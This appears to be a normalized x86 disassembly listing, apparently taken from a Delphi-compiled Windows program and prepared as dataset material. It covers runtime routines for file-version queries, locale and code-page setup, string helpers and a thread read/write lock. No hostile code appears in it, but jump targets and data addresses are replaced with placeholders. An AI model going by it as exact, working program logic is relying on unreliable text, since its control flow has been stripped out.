push eax
call GetModuleFileNameA
test eax eax
je r-xdata
mov esi [ ebx + 0x18 ]
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x10 ] 0x1000
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x144 ] 0x5
lea eax [ ebp - 0x150 ]
lea edx [ ebp - 0x125 ]
mov ecx 0x105
call sub_404158
mov eax [ ebp - 0x150 ]
lea edx [ ebp - 0x14c ]
call sub_408594
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x13c ] 0xb
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x134 ] 0xb
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x12c ] 0x5
lea eax [ ebp - 0x148 ]
push eax
push 0x3
lea edx [ ebp - 0x154 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x154 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bf9e
lea eax [ ebp - 0x170 ]
call sub_403ee8
lea eax [ ebp - 0x154 ]
mov edx 0x3
call sub_403f0c
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_40bfa8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40c063
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40bd44
and eax 0xff
mov edx eax
add edx 0xfffffffd
sub edx 0x8
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b9c8
mov ebx eax
jmp r-xdata
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
push ebp
call sub_40bddc
pop ecx
mov ebx eax
jmp r-xdata
dec edx
sub edx 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c06a
lea eax [ ebp - 0x10 ]
call sub_403ee8
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
mov ebx eax
sub_40c084
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_40c074
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_40bdc4
mov eax [ rw-data ]
mov [ eax ] sub_40bfa8
mov eax sub_40bd10
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40bd2c
mov edx [ rw-data ]
mov [ edx ] eax
retn
sub_40c108
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
retn
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
call sub_403198
xor eax eax
mov [ rw-data ] eax
sub_40c188
add esp 0xffffff6c
mov [ esp ] 0x94
push esp
call GetVersionExA
test eax eax
je r-xdata
add esp 0x94
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
mov eax [ esp + 0xc ]
and eax 0xffff
mov [ rw-data ] eax
jmp r-xdata
mov eax rw-data
lea edx [ esp + 0x14 ]
mov ecx 0x80
call sub_404158
sub_40c218
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_40c2ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_403f80
lea eax [ ebp - 0x8 ]
call j_sub_4043b4#2
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4043a8
push eax
call GetFileVersionInfoSizeA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c2f5
lea eax [ ebp - 0x8 ]
call sub_403ee8
retn
mov eax ebx
call sub_4026dc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_40c2d1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4043a8
push eax
call GetFileVersionInfoA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4026fc
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
sub_40c304
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
mov eax edx
pop edi
pop esi
retn
cmp [ eax + edi ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov esi edi
dec esi
jmp r-xdata
mov al [ eax ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
mov ecx edi
sub ecx esi
and ecx 0x80000001
jns r-xdata
mov cl [ eax + esi ]
and ecx 0xff
bt [ rw-data ] ecx
jb r-xdata
test ecx ecx
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
dec esi
mov al [ eax + edi ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov dl 0x2
jmp r-xdata
mov dl 0x1
sub_40c37c
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4043a8
mov edx esi
dec edx
call sub_40c304
sub_40c3b8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4041a8
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_40c3e0
pop esi
pop ebx
retn
mov eax ebx
call sub_4041a8
mov esi eax
sub_40c3e0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
test esi esi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4041a8
cmp esi eax
jg r-xdata
mov edi esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
xor edi edi
cmp esi eax
jl r-xdata
mov dl [ ebx + eax - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
inc eax
mov edx eax
mov eax ebx
call sub_40c5f0
jmp r-xdata
inc edi
cmp esi eax
jge r-xdata
sub_40c438
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax edi
call sub_4041a8
mov [ ebp - 0xc ] eax
mov esi 0x1
mov ebx 0x1
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ebx [ ebp - 0xc ]
jge r-xdata
inc esi
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc ebx
mov edx ebx
mov eax edi
call sub_40c5f0
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40c5f0
dec eax
mov ebx eax
sub_40c4c8
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_4041a8
cmp ebx eax
jg r-xdata
cmp ebx 0x1
jle r-xdata
mov [ esp ] ebx
cmp [ rw-data ] 0x0
je r-xdata
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
dec edx
mov eax esi
call sub_40c438
dec ebx
cmp ebx [ esp + 0x4 ]
jg r-xdata
xor eax eax
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_4041a8
cmp eax [ esp ]
jg r-xdata
inc [ esp ]
jmp r-xdata
sub_40c52c
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_4041a8
cmp ebx eax
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
call sub_4041a8
mov ebx eax
mov [ esp ] ebx
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax esi
call sub_40c438
mov eax esi
call sub_4041a8
cmp eax [ esp ]
jge r-xdata
mov eax esi
call sub_4041a8
mov [ esp ] eax
jmp r-xdata
sub_40c5b4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ ebx + esi - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax ebx
call sub_4043a8
add eax esi
dec eax
call sub_40c58c
sub_40c5f0
push ebx
push esi
mov ebx edx
mov esi eax
lea eax [ ebx + 0x1 ]
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax esi
call sub_4043a8
add eax ebx
dec eax
call sub_40c58c
add eax ebx
sub_40c62c
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_4041a8
cmp ebx eax
jg r-xdata
cmp [ esi + ebx - 0x1 ] 0x5c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c37c
test al al
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_40c660
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebp eax
xor ebx ebx
test edi edi
jle r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4041a8
cmp edi eax
jg r-xdata
mov edx edi
mov eax esi
call sub_40c37c
test al al
jne r-xdata
mov eax ebp
call sub_4043a8
mov dl [ esi + edi - 0x1 ]
call sub_408848
test eax eax
setne bl
sub_40c6a4
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
xor edi edi
mov eax ebx
call sub_4043a8
push eax
mov eax esi
call sub_4043a8
mov ebp eax
mov eax ebp
pop edx
call sub_40c768
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
sub edi ebp
inc edi
sub_40c6dc
push ebx
push esi
push edi
push ebp
mov edi edx
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_407d5c
mov eax esi
call sub_4041a8
mov ebp eax
mov eax edi
mov edx ebp
call sub_404534
mov ebx 0x1
cmp ebp ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call j_sub_4043b4
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ edi ]
mov al [ eax + ebx - 0x1 ]
add al 0xbf
sub al 0x1a
jae r-xdata
inc ebx
mov eax edi
call j_sub_4043b4
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
jmp r-xdata
inc ebx
cmp ebp ebx
jge r-xdata
mov eax edi
call j_sub_4043b4
add [ eax + ebx - 0x1 ] 0x20
jmp r-xdata
sub_40c768
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test ebp ebp
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov eax esi
call sub_4086c4
mov [ esp ] eax
mov eax ebp
call sub_4086c4
mov edi eax
mov edx ebp
mov eax esi
call sub_40885c
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
xor ebx ebx
mov eax ebx
sub eax esi
mov edx [ esp ]
sub edx eax
cmp edi edx
jbe r-xdata
mov edx ebx
sub edx esi
mov eax esi
call sub_40c3a0
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x2
je r-xdata
cmp [ esp + 0x4 ] 0x1
jne r-xdata
push edi
push ebp
push edi
push ebx
push 0x0
push 0x400
call CompareStringA
cmp eax 0x2
je r-xdata
inc ebx
mov edx ebp
mov eax ebx
call sub_40885c
mov ebx eax
inc ebx
sub_40c808
push ebx
push esi
mov ebx edx
mov edx ebx
call sub_40c830
mov esi eax
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov esi eax
inc eax
mov edx ebx
call sub_40c830
test eax eax
jne r-xdata
sub_40c830
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_408848
mov edi eax
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx edi
sub edx esi
mov eax esi
call sub_40c3a0
sub al 0x1
jb r-xdata
je r-xdata
inc edi
jmp r-xdata
inc edi
mov edx ebx
mov eax edi
call sub_408848
mov edi eax
test edi edi
jne r-xdata
sub_40c870
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
xor edx edx
push ebp
push sub_40c8d4
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0x7 ]
push edx
push 0x1004
push eax
call GetLocaleInfoA
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0x7 ]
mov ecx 0x7
call sub_404158
mov eax [ ebp - 0xc ]
push eax
call GetACP
mov edx eax
pop eax
call sub_4080b0
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c8db
lea eax [ ebp - 0xc ]
call sub_403ee8
retn
sub_40c8e4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xffffffec
push edi
mov eax [ rw-data ]
call sub_40c870
push eax
call GetCPInfo
xor esi esi
jmp r-xdata
cmp esi 0xc
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov al [ edi + esi + 0x6 ]
or al [ edi + esi + 0x7 ]
jne r-xdata
mov al [ edi + esi + 0x6 ]
mov bl [ edi + esi + 0x7 ]
sub bl al
jb r-xdata
add esi 0x2
inc ebx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
and eax 0xff
bts [ rw-data ] eax
inc [ ebp - 0x1 ]
dec bl
jne r-xdata
sub_40c95c
push ebp
mov ebp esp
add esp 0xfffffe68
push ebx
push esi
push edi
mov [ rw-data ] 0x409
mov [ rw-data ] 0x9
mov [ rw-data ] 0x1
call GetThreadLocale
test eax eax
je r-xdata
test ax ax
je r-xdata
mov [ rw-data ] eax
mov esi r-xdata
mov edi rw-data
mov ecx 0x8
[ edi ] [ esi ]
cmp [ rw-data ] 0x2
jne r-xdata
mov edx eax
and dx 0x3ff
movzx edx dx
mov [ rw-data ] edx
movzx eax ax
shr eax 0xa
mov [ rw-data ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ rw-data ] al
push 0x2a
call GetSystemMetrics
test eax eax
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
call sub_40c944
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_40c8e4
pop ecx
push ebp
call sub_40c8e4
pop ecx
mov eax rw-data
mov edx r-xdata
mov cl 0x20
call sub_402cd8
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
jmp r-xdata
mov eax 0x80
lea edx [ ebp - 0x94 ]
mov [ rw-data ] 0x0
jmp r-xdata
mov [ edx ] al
inc eax
inc edx
cmp eax 0x100
jne r-xdata
lea eax [ ebp - 0x94 ]
lea edx [ ebp - 0x196 ]
push edx
push 0x80
push eax
push 0x2
mov eax [ rw-data ]
push eax
call GetStringTypeExA
mov eax 0x80
lea edx [ ebp - 0x196 ]
add edx 0x2
dec eax
jne r-xdata
cmp [ edx ] 0x2
sete cl
mov [ rw-data ] cl
test cl cl
jne r-xdata
jmp r-xdata
sub_40cad0
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push sub_40cd9b
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_40c95c
call sub_40b2bc
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax ebx
call sub_40b20c
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_403f3c
lea eax [ ebp - 0x14 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax ebx
call sub_40b20c
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_4080b0
mov [ rw-data ] al
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax ebx
call sub_40b20c
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_4080b0
mov [ rw-data ] al
mov cl 0x2c
mov edx 0xf
mov eax ebx
call sub_40b258
mov [ rw-data ] al
mov cl 0x2e
mov edx 0xe
mov eax ebx
call sub_40b258
mov [ rw-data ] al
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax ebx
call sub_40b20c
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_4080b0
mov [ rw-data ] al
mov cl 0x2f
mov edx 0x1d
mov eax ebx
call sub_40b258
mov [ rw-data ] al
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax ebx
call sub_40b20c
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_40b544
mov edx [ ebp - 0x20 ]
mov eax rw-data
call sub_403f3c
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax ebx
call sub_40b20c
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_40b544
mov edx [ ebp - 0x28 ]
mov eax rw-data
call sub_403f3c
mov cl 0x3a
mov edx 0x1e
mov eax ebx
call sub_40b258
mov [ rw-data ] al
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax ebx
call sub_40b20c
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_403f3c
lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax ebx
call sub_40b20c
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_403f3c
lea eax [ ebp - 0x8 ]
call sub_403ee8
lea eax [ ebp - 0xc ]
call sub_403ee8
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax ebx
call sub_40b20c
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_4080b0
test eax eax
jne r-xdata
call sub_40b494
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f80
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f80
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_404268
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_404268
mov cl 0x2c
mov edx 0xc
mov eax ebx
call sub_40b258
mov [ rw-data ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cda2
lea eax [ ebp - 0x40 ]
mov edx 0x10
call sub_403f0c
retn
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax ebx
call sub_40b20c
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_4080b0
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax ebx
call sub_40b20c
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_4080b0
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_403f80
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_403f80
jmp r-xdata
sub_40ce50
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_40cee0
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
mov edx eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40b1c0
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac0
mov edx eax
jmp r-xdata
mov [ edx + 0xc ] ebx
mov eax edx
call sub_403924
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cee7
lea eax [ ebp - 0x14 ]
call sub_403ee8
retn
sub_40cf38
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
pop ebx
retn
mov eax sub_408650
mov [ rw-data ] eax
sub_40cfbc
push ebx
push esi
push edi
push ebp
call sub_403524
mov ebx edx
mov edi eax
xor esi esi
inc esi
cmp esi 0x10
jne r-xdata
mov eax ebp
mov ebp [ ebp ]
call sub_4026fc
test ebp ebp
jne r-xdata
mov ebp [ edi + esi * 4 + 0x4 ]
xor eax eax
mov [ edi + esi * 4 + 0x4 ] eax
test ebp ebp
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_403188
test bl bl
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40350c
sub_40d024
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_40d00c
mov ebx eax
call GetCurrentThreadId
mov esi eax
xor eax eax
mov al bl
mov ebp [ edi + eax * 4 + 0x4 ]
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
cmp esi [ ebp + 0x4 ]
jne r-xdata
mov eax [ esp ]
mov [ eax ] ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40d0ac
mov ebp eax
test ebp ebp
jne r-xdata
mov ebp [ ebp ]
mov eax 0x10
call sub_407b64
mov ebp eax
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] 0x7fffffff
mov [ ebp ] ebp
xor eax eax
mov al bl
lea eax [ edi + eax * 4 + 0x4 ]
mov edx ebp
call sub_40cfac
mov [ ebp ] eax
sub_40d0ac
push ebx
mov ebx eax
mov eax ebx
call sub_40d00c
and eax 0xff
mov ebx [ ebx + eax * 4 + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
lea eax [ ebx + 0x8 ]
mov edx 0x7fffffff
call sub_40cfac
cmp eax 0x7fffffff
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
call GetCurrentThreadId
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_40d0ec
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403168
mov [ esi + 0xc ] 0xffff
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventA
mov [ esi + 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ esi + 0x20 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_40d160
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax esi
call sub_40d1ec
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403188
mov eax [ esi + 0x10 ]
push eax
call CloseHandle
mov eax [ esi + 0x14 ]
push eax
call CloseHandle
mov eax [ esi + 0x20 ]
call sub_403198
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_40d1ec
push ebx
push esi
push edi
push ebp
push ecx
mov edi eax
mov bl 0x1
call GetCurrentThreadId
mov esi eax
cmp esi [ edi + 0x24 ]
je r-xdata
inc [ edi + 0x1c ]
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40d1a8
mov ebp [ edi + 0x28 ]
mov edx esp
mov eax [ edi + 0x20 ]
call sub_40d024
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
seta bl
test bl bl
je r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff0001
call sub_40cfb4
cmp eax 0xffff
jne r-xdata
lea eax [ edi + 0xc ]
call sub_40cf94
jmp r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff
call sub_40cfb4
test eax eax
je r-xdata
mov eax edi
call sub_40d1a8
test bl bl
je r-xdata
mov eax edi
call sub_40d1dc
mov [ edi + 0x24 ] esi
lea eax [ edi + 0x28 ]
call sub_40cf94
dec eax
cmp eax ebp
sete bl
lea eax [ edi + 0xc ]
call sub_40cfa0
sub_40d288
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d024
dec [ ebx + 0x1c ]
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0xc ]
mov edx 0xffff
call sub_40cfb4
mov eax ebx
call sub_40d1c0
mov eax ebx
call sub_40d1b4
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d09c
sub_40d2d8
push ebx
push esi
push ecx
mov esi eax
mov edx esp
mov eax [ esi + 0x20 ]
call sub_40d024
mov eax [ esp ]
inc [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x1
seta bl
call GetCurrentThreadId
cmp eax [ esi + 0x24 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax esi
call sub_40d1cc
jmp r-xdata
lea eax [ esi + 0xc ]
call sub_40cfa0
test eax eax
jle r-xdata
lea eax [ esi + 0xc ]
call sub_40cf94
cmp eax 0xffff
jne r-xdata
push 0x0
call Sleep
mov eax esi
call sub_40d1cc
mov eax esi
call sub_40d1c0
sub_40d344
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d024
mov eax [ esp ]
dec [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d09c
call GetCurrentThreadId
cmp eax [ ebx + 0x24 ]
je r-xdata
lea eax [ ebx + 0xc ]
call sub_40cf94
mov ecx eax
cmp ecx 0xffff
jne r-xdata
